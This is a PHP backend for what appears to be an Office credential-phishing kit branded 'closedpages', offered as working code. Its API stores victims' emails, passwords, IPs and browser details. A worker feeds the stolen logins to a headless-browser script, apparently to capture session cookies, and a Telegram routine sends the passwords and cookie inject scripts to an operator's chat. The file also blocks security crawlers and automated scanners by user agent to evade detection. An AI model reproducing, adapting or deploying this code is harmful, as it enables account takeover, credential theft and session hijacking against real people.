<?php
namespace App;

use Exception;
use PDO;
use PDOException;

class Config {
    public static function load(): array {
        $configPath = __DIR__ . '/../config.json.enc';
        $cfg = [];
        if (file_exists($configPath)) {
            $json = Crypto::loadEncrypted($configPath);
            if ($json) {
                $decoded = json_decode($json, true);
                if (is_array($decoded)) {
                    $cfg = $decoded;
                }
            }
        }

        // Support Environment Variables (Render/Docker)
        $envBotToken = getenv('TELEGRAM_BOT_TOKEN');
        if ($envBotToken) {
            $cfg['telegramBotToken'] = $envBotToken;
        }
        
        $envChatId = getenv('TELEGRAM_CHAT_ID');
        if ($envChatId) {
            $cfg['telegramChatId'] = $envChatId;
        }

        $envTelemetry = getenv('TELEMETRY_ENABLED');
        if ($envTelemetry !== false) {
             $cfg['telemetryEnabled'] = filter_var($envTelemetry, FILTER_VALIDATE_BOOLEAN);
        }

        return $cfg;
    }

    public static function save(array $data): bool {
        $configPath = __DIR__ . '/../config.json.enc';
        $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        if ($json === false) return false;
        return Crypto::saveEncrypted($configPath, $json);
    }
}

class Worker {
    public static function run() {
        echo "🚀 Worker started. Waiting for jobs...\n";
        
        try {
            $db = new Database();
            $pdo = $db->getPdo();
        } catch (Exception $e) {
            echo "❌ Fatal DB Error: " . $e->getMessage() . "\n";
            exit(1);
        }
        
        $lastCleanup = 0;
        
        while (true) {
            try {
                // --- Self-Healing: Periodic Cleanup of Stale Jobs ---
                if (time() - $lastCleanup > 30) {
                    self::cleanupStaleJobs($pdo);
                    $lastCleanup = time();
                }

                $pdo->beginTransaction();
                
                // Optimistic Locking: Try to claim a task
                $stmt = $pdo->prepare("SELECT * FROM tasks WHERE status = 'pending' ORDER BY id ASC LIMIT 1");
                $stmt->execute();
                $task = $stmt->fetch(PDO::FETCH_ASSOC);
                
                if ($task) {
                    // Try to claim the task atomically
                    $updateStmt = $pdo->prepare("UPDATE tasks SET status = 'processing', updated_at = CURRENT_TIMESTAMP WHERE id = :id AND status = 'pending'");
                    $updateStmt->execute([':id' => $task['id']]);
                    
                    if ($updateStmt->rowCount() === 0) {
                        $pdo->commit();
                        continue;
                    }
                    
                    $pdo->commit();
                    
                    echo "Processing Job #{$task['id']} for {$task['email']} (CookieID: {$task['cookie_id']})...\n";

                    if (empty($task['password'])) {
                        echo "❌ Error: Empty password for Job #{$task['id']}. Marking as failed.\n";
                        $pdo->prepare("UPDATE tasks SET status = 'failed', updated_at = CURRENT_TIMESTAMP WHERE id = :id")
                            ->execute([':id' => $task['id']]);
                        continue;
                    }
                        
                    $baseDir = realpath(__DIR__ . '/..');
                    // In deployment, index.php and consolidated.js are likely in the same root
                    // If App.php is in src/, baseDir is the parent folder (the root)
                    // If the user deployed to /var/www/html, then baseDir is /var/www/html/MA (or just /var/www/html if flat)
                    
                    // Force the project root to be the baseDir for simplicity, matching user's working flow
                    $projectRoot = $baseDir; 
                    
                    // Match the working user flow exactly:
                    // HOME=/var/www/html
                    // PUPPETEER_CACHE_DIR=/var/www/html/puppeteer_chrome
                    
                    // We can try to detect if we are in /var/www/html
                    if (strpos($baseDir, '/var/www/html') !== false) {
                         $projectRoot = '/var/www/html';
                    }

                    $cacheDir = $projectRoot . '/puppeteer_chrome';
                    $configDir = $projectRoot . '/chrome_config';
                    
                    if ($cacheDir && !is_dir($cacheDir)) {
                        @mkdir($cacheDir, 0777, true);
                    }
                    if ($configDir && !is_dir($configDir)) {
                        @mkdir($configDir, 0777, true);
                    }
                    $deploymentFile = $projectRoot . '/deployment.json';
                    $apiBase = '';
                    if (is_file($deploymentFile)) {
                        $deployment = json_decode(@file_get_contents($deploymentFile), true);
                        if (is_array($deployment) && !empty($deployment['main_domain'])) {
                            $apiBase = 'https://' . $deployment['main_domain'];
                        }
                    }
                    if ($apiBase === '') {
                        $apiBase = 'https://localhost';
                    }

                    $cmd = "cd " . escapeshellarg($projectRoot) .
                           " && HOME=" . escapeshellarg($projectRoot) .
                           " XDG_CONFIG_HOME=" . escapeshellarg($configDir) .
                           " XDG_CACHE_HOME=" . escapeshellarg($cacheDir) .
                           " PUPPETEER_CACHE_DIR=" . escapeshellarg($cacheDir) .
                           " API_BASE_URL=" . escapeshellarg($apiBase) .
                           " node " . escapeshellarg($projectRoot . '/consolidated.js') . " " .
                           escapeshellarg($task['email']) . " " .
                           escapeshellarg($task['password']) . " " .
                           escapeshellarg($task['cookie_id']) . " --verbose";
                    
                    // 2. Execution with Timeout
                    $timeout = 180; // 3 minutes timeout
                    $descriptors = [
                        0 => ["pipe", "r"], // stdin
                        1 => ["pipe", "w"], // stdout
                        2 => ["pipe", "w"]  // stderr
                    ];
                    
                    $process = proc_open($cmd, $descriptors, $pipes);
                    $outputStr = "";
                    $returnVar = -1;
                    
                    if (is_resource($process)) {
                        $startTime = time();
                        $status = proc_get_status($process);
                        
                        while ($status['running']) {
                            if (time() - $startTime > $timeout) {
                                echo "⚠️ Process timed out! Terminating...\n";
                                proc_terminate($process, 9); // SIGKILL
                                $returnVar = 124; // Timeout exit code convention
                                break;
                            }
                            usleep(500000); // 0.5s check
                            $status = proc_get_status($process);
                        }
                        
                        // Read remaining output
                        $outputStr = stream_get_contents($pipes[1]);
                        $errStr = stream_get_contents($pipes[2]);
                        if ($outputStr !== false && $outputStr !== '') echo $outputStr . "\n";
                        if ($errStr) echo "Stderr: $errStr\n";
                        
                        fclose($pipes[0]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        
                        if ($returnVar === -1) {
                            $returnVar = proc_close($process);
                        } else {
                            proc_close($process); // Close resource after termination
                        }
                    } else {
                        echo "❌ Failed to start process.\n";
                        $returnVar = 1;
                    }
                
                    if (strpos($outputStr, 'CONSOLIDATED SUCCESS') !== false) {
                        $finalStatus = 'completed';
                    } else {
                        $finalStatus = ($returnVar === 0) ? 'completed' : 'failed';
                    }
                    
                    // --- Telegram Notification ---
                    $cfg = Config::load();
                    if (!empty($cfg['telemetryEnabled']) && !empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
                         self::sendTelegramCookies($task, $cfg, $db, $finalStatus);
                    }
                    
                    $maxRetries = 3;
                    $retryCount = 0;
                    while ($retryCount < $maxRetries) {
                        try {
                            $pdo->prepare("UPDATE tasks SET status = :status, updated_at = CURRENT_TIMESTAMP WHERE id = :id")
                                ->execute([':status' => $finalStatus, ':id' => $task['id']]);
                            break;
                        } catch (PDOException $e) {
                            if (strpos($e->getMessage(), 'database is locked') !== false) {
                                $retryCount++;
                                echo "Database locked, retrying update (attempt $retryCount)...\n";
                                sleep(1);
                            } else {
                                throw $e;
                            }
                        }
                    }
                        
                    echo "Job #{$task['id']} finished: {$finalStatus}\n";
                    
                } else {
                    $pdo->commit();
                    sleep(1);
                }
            } catch (Exception $e) {
                if ($pdo->inTransaction()) {
                    $pdo->rollBack();
                }
                echo "Error: " . $e->getMessage() . "\n";
                sleep(5);
            }
        }
    }

    private static function cleanupStaleJobs($pdo) {
        try {
            $stmt = $pdo->prepare("UPDATE tasks SET status = 'failed', updated_at = CURRENT_TIMESTAMP WHERE status = 'processing' AND updated_at < datetime('now', '-90 seconds')");
            $stmt->execute();
            $count = $stmt->rowCount();
            if ($count > 0) {
                echo "🧹 Self-Healing: Cleaned up $count stale/stuck jobs (marked as failed).\n";
            }
        } catch (Exception $e) {
            echo "⚠️ Cleanup Error: " . $e->getMessage() . "\n";
        }
    }

    private static function sendTelegramCookies($task, $cfg, $db, $finalStatus) {
        $botToken = $cfg['telegramBotToken'];
        $chatId = $cfg['telegramChatId'];
        
        $cookieId = $task['cookie_id'];
        $email = $task['email'];
        $password = isset($task['password']) ? $task['password'] : 'N/A';
        
        $event = $db->getEventInfo($cookieId);
        $ip = $event ? $event['ip'] : 'Unknown';
        $ua = $event ? $event['ua'] : 'Unknown';
        
        $baseDir = realpath(__DIR__ . '/..');
        $injectFile = $baseDir . '/session_data/inject_session_' . $cookieId . '.js';
        
        $message = " @closedpages ⭐️office⭐️ COOKIE " . ($finalStatus !== 'completed' ? "(FAILED)" : "") . " \n";
        $message .= "     \n";
        $message .= " { \n";
        $message .= "     \"officeEmail\": \"$email\", \n";
        $message .= "     \"officePassword1\": \"$password\", \n";
        $message .= " } \n";
        $message .= " \n";
        $message .= " \n";
        $message .= " ##      USER FINGERPRINTS       ## \n";
        $message .= " IP: $ip \n";
        $message .= " INFORMATION: ANTIBOT \n";
        $message .= " USERAGENT: $ua \n";
        $message .= " /////// POWERED BY CLOSEDPAGES /////////";
        
        $urlMsg = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $payloadMsg = [
            'chat_id' => $chatId,
            'text' => $message
        ];
        
        self::sendRequest($urlMsg, $payloadMsg, $cfg);
        
        if (file_exists($injectFile)) {
            $urlDoc = "https://api.telegram.org/bot{$botToken}/sendDocument";
            $payloadDoc = [
                'chat_id' => $chatId,
                'document' => new \CURLFile($injectFile, 'application/javascript', "cookies_{$email}.js"),
                'caption' => "Inject Script for $email"
            ];
            
            self::sendRequest($urlDoc, $payloadDoc, $cfg, true);
        }
        
        echo "✅ Telegram notification sent for $email (Status: $finalStatus)\n";
    }

    private static function sendRequest($url, $payload, $cfg, $isMultipart = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        
        if ($isMultipart) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        }
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        if (!empty($cfg['proxyEnabled']) && !empty($cfg['proxyUrl'])) {
            curl_setopt($ch, CURLOPT_PROXY, $cfg['proxyUrl']);
        }
        
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "❌ Telegram Curl Error: " . curl_error($ch) . "\n";
        }
        return $result;
    }
}

class Console {
    public static function handle(array $argv) {
        if (count($argv) < 3) {
            echo "Usage: php index.php manage [encrypt|decrypt] [file]\n";
            exit(1);
        }

        $mode = $argv[2];
        $file = $argv[3];

        if (!file_exists($file)) {
            echo "File not found: $file\n";
            exit(1);
        }

        $content = file_get_contents($file);

        if ($mode === 'encrypt') {
            if (substr($file, -4) === '.enc') {
                echo "Warning: File seems already encrypted (.enc extension).\n";
            }
            $outFile = $file . '.enc';
            if (Crypto::saveEncrypted($outFile, $content)) {
                echo "Encrypted to $outFile\n";
            } else {
                echo "Encryption failed.\n";
            }
        } elseif ($mode === 'decrypt') {
            $decrypted = Crypto::loadEncrypted($file);
            if ($decrypted === false) {
                echo "Decryption failed.\n";
                exit(1);
            }
            $outFile = (substr($file, -4) === '.enc') ? substr($file, 0, -4) : $file . '.dec';
            if (file_put_contents($outFile, $decrypted) !== false) {
                echo "Decrypted to $outFile\n";
            } else {
                echo "Write failed.\n";
            }
        } else {
            echo "Invalid mode.\n";
        }
    }
}

class Crypto {
    private const METHOD = 'aes-256-cbc';

    private static function getKey(): string {
        $key = $_ENV['ENC_KEY'] ?? getenv('ENC_KEY');
        return is_string($key) ? $key : '';
    }

    public static function saveEncrypted(string $path, string $data): bool {
        $key = self::getKey();
        if ($key === '') return false;

        $ivLength = openssl_cipher_iv_length(self::METHOD);
        $iv = openssl_random_pseudo_bytes($ivLength);
        $encrypted = openssl_encrypt($data, self::METHOD, $key, 0, $iv);
        
        if ($encrypted === false) return false;

        $fp = fopen($path, 'w');
        if (!$fp) return false;

        $success = false;
        if (flock($fp, LOCK_EX)) {
            $bytes = fwrite($fp, $iv . $encrypted);
            flock($fp, LOCK_UN);
            if ($bytes !== false) $success = true;
        }
        fclose($fp);
        return $success;
    }

    public static function loadEncrypted(string $path) {
        if (!file_exists($path)) return false;
        $content = file_get_contents($path);
        if ($content === false) return false;

        $key = self::getKey();
        if ($key === '') return false;

        $ivLength = openssl_cipher_iv_length(self::METHOD);
        if (strlen($content) < $ivLength) return false;

        $iv = substr($content, 0, $ivLength);
        $encrypted = substr($content, $ivLength);

        return openssl_decrypt($encrypted, self::METHOD, $key, 0, $iv);
    }
}

class Database {
    private $pdo;

    public function __construct() {
        $dbPath = __DIR__ . '/../database.sqlite';
        $dir = dirname($dbPath);
        if (!is_dir($dir)) mkdir($dir, 0755, true);
        
        if (file_exists($dbPath) && !is_writable($dbPath)) {
            chmod($dbPath, 0666);
        }

        $init = !file_exists($dbPath) || filesize($dbPath) === 0;
        
        try {
            $this->pdo = new PDO('sqlite:' . $dbPath);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
            $this->pdo->exec('PRAGMA journal_mode = WAL;');
            $this->pdo->exec('PRAGMA busy_timeout = 5000;');
            
            if ($init) {
                $this->initializeSchema();
            }
        } catch (PDOException $e) {
            throw new Exception("Database error: " . $e->getMessage());
        }
    }

    private function initializeSchema() {
        $this->pdo->exec("CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cookie_id TEXT,
            type TEXT,
            email_mask TEXT,
            domain TEXT,
            attempt INTEGER,
            password TEXT,
            ip TEXT,
            ua TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )");

        $this->pdo->exec("CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cookie_id TEXT,
            email TEXT,
            password TEXT,
            status TEXT DEFAULT 'pending',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )");
        
        $this->pdo->exec("CREATE INDEX IF NOT EXISTS idx_events_cookie_id ON events(cookie_id)");
        $this->pdo->exec("CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status)");
    }

    public function getPdo() {
        return $this->pdo;
    }

    public function logEvent($data) {
        $stmt = $this->pdo->prepare("INSERT INTO events (
            cookie_id, type, email_mask, domain, attempt, password, ip, ua, created_at
        ) VALUES (
            :cookie_id, :type, :email_mask, :domain, :attempt, :password, :ip, :ua, :created_at
        )");
        
        return $stmt->execute([
            ':cookie_id' => $data['cookieId'],
            ':type' => $data['type'],
            ':email_mask' => $data['emailMask'],
            ':domain' => $data['domain'],
            ':attempt' => $data['attempt'],
            ':password' => $data['password'],
            ':ip' => $data['ip'],
            ':ua' => $data['ua'],
            ':created_at' => $data['time']
        ]);
    }

    public function addTask($cookieId, $email, $password) {
        $stmt = $this->pdo->prepare("INSERT INTO tasks (cookie_id, email, password, status) VALUES (:cookie_id, :email, :password, 'pending')");
        return $stmt->execute([
            ':cookie_id' => $cookieId,
            ':email' => $email,
            ':password' => $password
        ]);
    }

    public function getEventInfo($cookieId) {
        $stmt = $this->pdo->prepare("SELECT ip, ua FROM events WHERE cookie_id = :cookie_id ORDER BY id DESC LIMIT 1");
        $stmt->execute([':cookie_id' => $cookieId]);
        return $stmt->fetch();
    }
}

class Router {
    public static function handle() {
        $uri = $_SERVER['REQUEST_URI'] ?? '';
        $path = parse_url($uri, PHP_URL_PATH);
        $email = '';

        if ($path && $path !== '/' && $path !== '/index.php') {
            // Check for admin URL pattern with email (e.g. /admin.html/user@example.com)
            if (strpos($path, '/admin.html/') === 0) {
                // Do not extract email for admin path to prevent interfering with admin routing
                // The admin routing in index.php expects /admin.html exactly or handled there
                // However, index.php currently only matches exact '/admin.html'.
                // We need to handle this in index.php, but here we should just return empty email
                // or let index.php handle it.
                return ['email' => ''];
            }

            $parts = explode('/', trim($path, '/'));
            foreach (array_reverse($parts) as $part) {
                $part = urldecode($part);
                if (strpos($part, '@') !== false) {
                     if (preg_match('/^[^\s@]+@[^\s@]+\.[^\s@]+$/', $part)) {
                         $email = $part;
                         break;
                     }
                }
            }
            return ['email' => $email];
        } else {
            return ['email' => ''];
        }
    }
}

class Security {
    public static function getClientIp(): string {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        }
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($xff[0]);
        }
        return $_SERVER['REMOTE_ADDR'] ?? '';
    }

    public static function hasProxyHeaders(): bool {
        if (!empty($_SERVER['HTTP_VIA'])) return true;
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $xff = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (strpos($xff, ',') !== false) return true;
        }
        return false;
    }

    public static function rdnsBlocked(string $ip, array $patterns): bool {
        // Simplified: Disabled complex RDNS checks to avoid performance hits and complexity
        return false;
    }

    public static function checkIpReputation(string $ip, string $apiKey = ''): array {
        // Simplified: No external API calls, just basic local check stub
        return ['blocked' => false, 'reason' => ''];
    }

    public static function isBotUserAgent(): bool {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        if (empty($ua)) return true;

        $bots = [
            'bot', 'crawl', 'spider', 'slurp', 'facebook', 'facebot',
            'curl', 'wget', 'python', 'libwww', 'httpunit', 'nmap',
            'phantomjs', 'headless', 'selenium', 'puppeteer',
            'postman', 'insomnia', 'axios', 'got', 'node-fetch'
        ];

        foreach ($bots as $bot) {
            if (strpos($ua, $bot) !== false) {
                return true;
            }
        }
        return false;
    }

    public static function isMissingStandardHeaders(): bool {
        if (empty($_SERVER['HTTP_ACCEPT'])) return true;
        if (empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) return true;
        return false;
    }
}

class Api {
    public static function handle() {
        header_remove('X-Powered-By');
        header('Content-Type: application/json');
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
        header('Access-Control-Allow-Headers: Content-Type');
        ignore_user_abort(true);
        set_time_limit(0);

        if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
            echo json_encode(['ok' => true]);
            exit;
        }

        $action = $_GET['action'] ?? '';

        switch ($action) {
            case 'save_config': self::handleSaveConfig(); break;
            case 'get_config': self::handleGetConfig(); break;
            case 'clear_logs': self::handleClearLogs(); break;
            case 'get_cookies': self::handleGetCookies(); break;
            case 'get_events': self::handleGetEvents(); break;
            case 'log_event': self::handleLogEvent(); break;
            case 'get_structure': self::handleGetStructure(); break;
            default:
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid action']);
            break;
        }
    }

    private static function handleGetEvents() {
        try {
            $db = new Database();
            $pdo = $db->getPdo();

            $stmt = $pdo->query("
                SELECT e.*, t.status as task_status 
                FROM events e 
                LEFT JOIN tasks t ON e.cookie_id = t.cookie_id 
                ORDER BY e.id DESC
            ");
            
            $events = [];
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $event = [
                    'type' => $row['type'],
                    'emailMask' => $row['email_mask'],
                    'domain' => $row['domain'],
                    'attempt' => intval($row['attempt']),
                    'password' => $row['password'],
                    'ip' => $row['ip'],
                    'ua' => $row['ua'],
                    'time' => $row['created_at'],
                    'cookieId' => $row['cookie_id'],
                    'botStatus' => $row['task_status'] ?? 'pending'
                ];
                
                if ($event['botStatus'] !== 'completed') {
                    $scriptFile = __DIR__ . '/../session_data/inject_session_' . $row['cookie_id'] . '.js';
                    if (file_exists($scriptFile) && filesize($scriptFile) > 0) {
                        $event['botStatus'] = 'completed';
                    }
                }
                
                $scriptFile = __DIR__ . '/../session_data/inject_session_' . $row['cookie_id'] . '.js';
                $event['hasScript'] = (file_exists($scriptFile) && filesize($scriptFile) > 0);
                
                $events[] = $event;
            }

            echo json_encode(['ok' => true, 'events' => $events]);
        } catch (Exception $e) {
            echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
        }
    }

    private static function handleLogEvent() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        try {
            $db = new Database();
            
            // Extract fields
            $email = isset($data['emailMask']) ? $data['emailMask'] : '';
            $password = isset($data['password']) ? $data['password'] : '';
            $type = isset($data['type']) ? $data['type'] : 'unknown';
            $domain = isset($data['domain']) ? $data['domain'] : '';
            $attempt = isset($data['attempt']) ? $data['attempt'] : 0;

            if (!empty($password) && !empty($email)) {
                // PATH B: Task Execution (Has Cookies)
                // Use a proper task cookie ID
                $cookieId = uniqid('cookie_', true);
                
                // Add task for worker
                $db->addTask($cookieId, $email, $password);
                
                // Log event using the task ID so it matches the worker output
                // We use the actual $type from the request (e.g. 'password_fail_first') 
                // instead of hardcoding 'password', so the UI is accurate.
                $db->logEvent([
                    'cookieId' => $cookieId,
                    'type' => $type,
                    'emailMask' => $email,
                    'domain' => $domain,
                    'attempt' => $attempt,
                    'password' => $password,
                    'ip' => Security::getClientIp(),
                    'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                    'time' => date('c')
                ]);

                // Trigger Worker
                $baseDir = realpath(__DIR__ . '/..');
                if ($baseDir) {
                    $cmd = "cd " . escapeshellarg($baseDir) . " && (ps aux | grep 'php index.php worker' | grep -v grep >/dev/null 2>&1 || nohup php index.php worker > project.log 2>&1 < /dev/null &)";
                    @shell_exec($cmd);
                }
            } else {
                // PATH A: Simple Visitor Log (No Cookies)
                // Only runs if no password is provided (e.g. email_ok step)
                $cookieId = uniqid('v_', true);
                
                $db->logEvent([
                    'cookieId' => $cookieId,
                    'type' => $type,
                    'emailMask' => $email,
                    'domain' => $domain,
                    'attempt' => $attempt,
                    'password' => $password,
                    'ip' => Security::getClientIp(),
                    'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                    'time' => date('c')
                ]);
            }

            echo json_encode(['ok' => true]);
        } catch (Exception $e) {
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
        }
    }

    private static function handleGetStructure() {
        $baseDir = realpath(__DIR__ . '/..');
        $structure = [];
        
        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($baseDir, \RecursiveDirectoryIterator::SKIP_DOTS),
            \RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $item) {
            $path = $item->getPathname();
            $relPath = substr($path, strlen($baseDir) + 1);
            
            // Skip sensitive or large folders
            if (strpos($relPath, 'vendor') === 0 || strpos($relPath, '.git') === 0 || strpos($relPath, 'session_data') === 0 || strpos($relPath, 'puppeteer_chrome') === 0) {
                continue;
            }

            $structure[] = [
                'path' => $relPath,
                'type' => $item->isDir() ? 'dir' : 'file',
                'size' => $item->isDir() ? 0 : $item->getSize(),
                'perms' => substr(sprintf('%o', $item->getPerms()), -4)
            ];
        }

        echo json_encode(['ok' => true, 'structure' => $structure]);
    }

    private static function handleSaveConfig() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        if (!$raw) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Empty body']);
            exit;
        }
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }
        
        $allowed = [
            'template', 'urlPath', 'redirectUrl', 'firstAttemptFail', 'loadingEnabled', 'loadingDelayMs',
            'telemetryEnabled', 'telegramBotToken', 'telegramChatId', 'securityEnabled',
            'allowedDomains', 'blockedDomains', 'cfTurnstileEnabled', 'cfSiteKey',
            'cfSecretKey', 'cfApiKey', 'cfEmail', 'cfZoneId', 'cfAccountId',
            'countryBlockingEnabled', 'allowedCountries', 'ipWhitelist',
            'proxyEnabled', 'proxyUrl', 'localLoggingEnabled',
            'vpnCheckEnabled', 'vpnApiKey', 'botCheckEnabled'
        ];
        $out = [];
        foreach ($allowed as $k) {
            if (array_key_exists($k, $data)) {
                $out[$k] = $data[$k];
            }
        }

        $ok = Config::save($out);
        if ($ok === false) {
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Write failed']);
            exit;
        }
        echo json_encode(['ok' => true]);
    }

    private static function handleGetConfig() {
        $cfg = Config::load();
        echo json_encode($cfg);
    }

    private static function handleClearLogs() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        
        try {
            $db = new Database();
            $pdo = $db->getPdo();
            $pdo->exec("DELETE FROM events");
            $pdo->exec("DELETE FROM tasks");
            $pdo->exec("VACUUM");
        } catch (Exception $e) {
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
            exit;
        }

        $sessionDir = __DIR__ . '/../session_data';
        if (is_dir($sessionDir)) {
            $files = glob($sessionDir . '/*');
            foreach ($files as $file) {
                if (is_file($file)) unlink($file);
            }
        }
        echo json_encode(['ok' => true]);
    }

    private static function handleGetCookies() {
        $id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $_GET['id']) : '';
        $type = isset($_GET['type']) ? $_GET['type'] : '';

        if (!$id) {
            echo json_encode(['ok' => false, 'error' => 'Missing ID']);
            exit;
        }
        $sessionDir = __DIR__ . '/../session_data';
        $jsFile = $sessionDir . '/inject_session_' . $id . '.js';
        $txtFile = $sessionDir . '/cookies_all_' . $id . '.txt';

        if ($type === 'js') {
            if (file_exists($jsFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($jsFile), 'type' => 'js']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Script not found']);
            }
        } elseif ($type === 'txt') {
            if (file_exists($txtFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
            }
        } else {
            if (file_exists($jsFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($jsFile), 'type' => 'js']);
            } elseif (file_exists($txtFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
            }
        }
    }
}
